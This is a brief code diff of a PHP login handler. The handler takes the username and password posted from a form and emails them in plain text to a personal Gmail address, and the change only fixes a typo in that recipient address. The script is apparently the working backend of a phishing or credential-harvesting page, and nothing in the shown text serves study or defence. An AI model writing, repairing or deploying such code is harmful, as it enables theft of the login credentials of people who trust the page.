@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    $to = "garciasraviaaxel@gmail.com";
+    $to = "garciasaraviaaxel@gmail.com";
     $subject = "Inicio de sesión - Datos de usuario";
     $message = "Usuario: " . $username . "\nContraseña: " . $password;
 
